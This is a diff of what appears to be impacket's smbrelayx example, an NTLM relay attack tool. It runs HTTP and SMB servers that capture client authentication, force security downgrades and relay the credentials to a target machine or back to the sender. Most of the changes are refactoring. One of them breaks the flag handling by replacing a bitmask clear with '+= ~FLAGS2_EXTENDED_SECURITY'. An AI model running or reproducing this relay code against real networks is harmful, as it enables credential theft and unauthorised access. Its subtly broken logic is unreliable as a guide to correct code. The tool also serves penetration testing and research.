@@ -48,6 +48,7 @@ from impacket.smbserver import *
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5 import nrpc
 from impacket.dcerpc.v5.ndr import NULL
+from impacket.spnego import ASN1_AID
 
 try:
  from Crypto.Cipher import DES, AES, ARC4
@@ -179,7 +180,7 @@ class SMBClient(smb.SMB):
 
         ppp = nrpc.ComputeNetlogonCredential('12345678', sessionKey)
 
-        resp = nrpc.hNetrServerAuthenticate3(dce, NULL, machineAccount + '\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, serverName+'\x00',ppp, 0x600FFFFF )
+        nrpc.hNetrServerAuthenticate3(dce, NULL, machineAccount + '\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, serverName+'\x00',ppp, 0x600FFFFF )
 
         clientStoredCredential = pack('<Q', unpack('<Q',ppp)[0] + 10)
 
@@ -343,15 +344,19 @@ class HTTPRelayServer(Thread):
             self.target = target
             self.exeFile = exeFile
             self.mode = mode
-            self.domainIp = None
-            self.machineAccount = None
-            self.machineHashes = None
+
             SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
 
     class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
         def __init__(self,request, client_address, server):
             self.server = server
             self.protocol_version = 'HTTP/1.1'
+            self.challengeMessage = None
+            self.target = None
+            self.client = None
+            self.machineAccount = None
+            self.machineHashes = None
+            self.domainIp = None
             logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.server.target))
             SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
 
@@ -378,7 +383,7 @@ class HTTPRelayServer(Thread):
 
         def do_GET(self):
             messageType = 0
-            if self.headers.getheader('Authorization') == None:
+            if self.headers.getheader('Authorization') is None:
                 self.do_AUTHHEAD(message = 'NTLM')
                 pass
             else:
@@ -395,11 +400,8 @@ class HTTPRelayServer(Thread):
                 if self.server.mode.upper() == 'REFLECTION':
                     self.target = self.client_address[0]
                     logging.info("Downgrading to standard security")
-                    extSec = False
                 else:
                     self.target = self.server.target
-                    extSec = True
-
                 try:
                     self.client = SMBClient(self.target, extended_security = True)
                     self.client.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
@@ -418,7 +420,7 @@ class HTTPRelayServer(Thread):
                 if authenticateMessage['user_name'] != '':
                     respToken2 = SPNEGO_NegTokenResp()
                     respToken2['ResponseToken'] = str(token)
-                    clientResponse, errorCode = self.client.sendAuth(self.challengeMessage['challenge'], respToken2.getData())                
+                    clientResponse, errorCode = self.client.sendAuth(self.challengeMessage['challenge'], respToken2.getData())
                 else:
                     # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
                     errorCode = STATUS_ACCESS_DENIED
@@ -443,6 +445,12 @@ class HTTPRelayServer(Thread):
     def __init__(self):
         Thread.__init__(self)
         self.daemon = True
+        self.domainIp = None
+        self.machineAccount = None
+        self.machineHashes = None
+        self.exeFile = None
+        self.target = None
+        self.mode = None
 
     def setTargets(self, target):
         self.target = target
@@ -460,8 +468,8 @@ class HTTPRelayServer(Thread):
 
     def run(self):
         logging.info("Setting up HTTP Server")
-        self.httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.mode)
-        self.httpd.serve_forever()
+        httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.mode)
+        httpd.serve_forever()
 
 class SMBRelayServer(Thread):
     def __init__(self):
@@ -473,6 +481,7 @@ class SMBRelayServer(Thread):
         self.domainIp = None
         self.machineAccount = None
         self.machineHashes = None
+        self.exeFile = None
 
         # Here we write a mini config for the server
         smbConfig = ConfigParser.ConfigParser()
@@ -508,8 +517,8 @@ class SMBRelayServer(Thread):
         if smbData.has_key(self.target):
             # Remove the previous connection and use the last one
             smbClient = smbData[self.target]['SMBClient']
-            del(smbClient)
-            del (smbData[self.target])
+            del smbClient
+            del smbData[self.target]
         logging.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target))
         try: 
             if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
@@ -519,7 +528,7 @@ class SMBRelayServer(Thread):
                     # Force standard security when doing reflection
                     logging.info("Downgrading to standard security")
                     extSec = False
-                    recvPacket['Flags2'] = recvPacket['Flags2'] & ( ~smb.SMB.FLAGS2_EXTENDED_SECURITY )
+                    recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
                 else:
                     extSec = True
             client = SMBClient(self.target, extended_security = extSec)
@@ -559,7 +568,7 @@ class SMBRelayServer(Thread):
             sessionSetupData.fromString(SMBCommand['Data'])
             connData['Capabilities'] = sessionSetupParameters['Capabilities']
 
-            if struct.unpack('B',sessionSetupData['SecurityBlob'][0])[0] != smb.ASN1_AID:
+            if struct.unpack('B',sessionSetupData['SecurityBlob'][0])[0] != ASN1_AID:
                # If there no GSSAPI ID, it must be an AUTH packet
                blob = SPNEGO_NegTokenResp(sessionSetupData['SecurityBlob'])
                token = blob['ResponseToken']
@@ -614,7 +623,6 @@ class SMBRelayServer(Thread):
                 # SMBRelay: Ok, so now the have the Auth token, let's send it
                 # back to the target system and hope for the best.
                 smbClient = smbData[self.target]['SMBClient']
-                authData = sessionSetupData['SecurityBlob']
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
                 if authenticateMessage['user_name'] != '':
@@ -758,6 +766,8 @@ class SMBRelayServer(Thread):
 if __name__ == '__main__':
 
     RELAY_SERVERS = ( SMBRelayServer, HTTPRelayServer )
+    # Init the example's logger theme
+    logger.init()
     print version.BANNER
     parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will try to SMB relay that connection to the target system or the original client")
     parser.add_argument("--help", action="help", help='show this help message and exit')
